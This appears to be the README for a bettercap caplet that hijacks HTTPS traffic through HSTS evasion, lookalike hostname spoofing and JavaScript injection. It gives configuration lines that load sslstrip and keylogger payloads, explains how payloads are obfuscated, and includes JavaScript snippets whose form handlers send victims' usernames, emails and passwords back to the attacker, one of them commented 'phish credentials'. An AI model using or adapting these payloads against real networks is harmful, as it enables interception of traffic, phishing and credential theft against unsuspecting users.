### <a href="./payloads/hijack.js">**hijack.js**</a> payload

This module injects files with a JavaScript payload (<a href="./payloads/hijack.js">**hijack.js**</a>) which acts as a callback for bettercap, and takes care of hostname spoofing in attributes of injected documents, as well as XMLHttpRequest.

Injecting <a href="./payloads/hijack.js">**hijack.js**</a> is essential for hostname spoofing.

### Scalable domain indexing (SSL log)

<br>

<p align="center">
  <img width="380px" src="https://github.com/user-attachments/assets/a419acb3-28b4-4927-a596-c96ab6c2552e" alt="Indexed domains that use HTTPS" />
</p>

When hosts respond with an HTTPS redirect, bettercap will save their hostname in lists that are sorted by domain prefixes, allowing the list to scale by reducing a considerable amount of overhead for the proxy module.

By default, this caplet will remap these lists of domains that were found in the file that you assigned to the `hstshijack.ssl.domains` variable on launch (to ensure that it is still in the right format). You can skip this by setting the `hstshijack.ssl.check` variable to `false`.

Bettercap will also send a HEAD request to unknown hosts that were discovered in the injected document and retrieved via a callback from the <a href="./payloads/hijack.js">**hijack.js**</a> payload. This is done to learn what hosts use HTTPS, ahead of time.

Hostnames that you target with the `hstshijack.targets` variable are automatically logged and indexed.

### Hostname spoofing

In the <a href="./hstshijack.cap">**caplet file**</a> you can assign comma separated domains to the `hstshijack.targets` variable. _(wildcard allowed)_

For every targeted hostname you must specify a replacement hostname, like this:

```sh
set hstshijack.targets       google.com, *.google.com
set hstshijack.replacements  google.corn,*.google.corn
```

You can try to make them as unnoticeable as you can, but your options are limited here in terms of evading HSTS.

### Block scripts

In the <a href="./hstshijack.cap">**caplet file**</a> you can block JavaScript from hosts by assigning them to the `hstshijack.blockscripts` variable. _(wildcard allowed)_ 

### Custom payloads

You can also inject your own scripts into files from your specified hosts by assigning them to the `hstshijack.payloads` variable.

Custom payloads are (optionally) obfuscated at launch, executed synchronously, and wrapped inside a function that is defined as a property of the current JavaScript context (globalThis). This is done to ensure that your payload is only executed once per application, even if injected multiple times. Individual payloads are not failsafe, so you must set your conditions/try and catch blocks yourself.

Example:

```sh
set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
```

You should always inject the <a href="./payloads/hijack.js">**hijack.js**</a> payload when spoofing hostnames.

### Obfuscation

You can write custom payloads that are automatically obfuscated by the module.

Basically, every word that was found beginning with `obf_` will be obfuscated.

Example: 

```js
function obf_function() {
  alert("Random variable: obf_whatever_follows")
}

obf_function()
```

Will be injected as:

```js
function jfIleNwmKoa() {
  alert("Random variable: AsjZnJWklwMNqshCaloE")
}

jfIleNwmKoa()
```

### Silent callbacks

You can have your payloads send callbacks to your machine that bettercap will print, but not proxy.

Example of a silent callback:

```js
form.onsubmit = function() {
  req = new XMLHttpRequest()
  req.open("POST", "http://" + location.host + "/obf_path_callback?username=" + username + "&password=" + password)
  req.send()
}
```

The following POST request will be sniffed by bettercap, but not proxied (the request will be dropped). 

Any instance of `obf_path_callback` will be replaced with the callback path (see example above).

### Whitelisting callbacks

You can automatically terminate an attack between specific clients and hosts by making the client's machine initiate a whitelisting callback.

Example of multiple whitelisting callbacks:

```js
// Whitelist multiple hosts to ensure the intended resources will load.

form.onsubmit = function() {
  // Whitelist current hostname and phish credentials
  req = new XMLHttpRequest()
  req.open("POST", "http://" + location.hostname + "/obf_path_whitelist?email=" + email + "&password=" + password)
  req.send()

  // Whitelist facebook
  req = new XMLHttpRequest()
  req.open("POST", "http://facedook.com/obf_path_whitelist")
  req.send()

  // Whitelist facebook CDN
  req = new XMLHttpRequest()
  req.open("POST", "http://static.xx.fdcdn.net/obf_path_whitelist")
  req.send()

  // Whitelist redirect to facebook
  req = new XMLHttpRequest()
  req.open("POST", "http://fd.com/obf_path_whitelist")
  req.send()
}
```

When a request is sent as above, bettercap will stop spoofing connections between the sender and the requested host.

If any resource from a spoofed host is requested that was previously whitelisted for that client, then that client will be redirected to the intended (unspoofed) host.
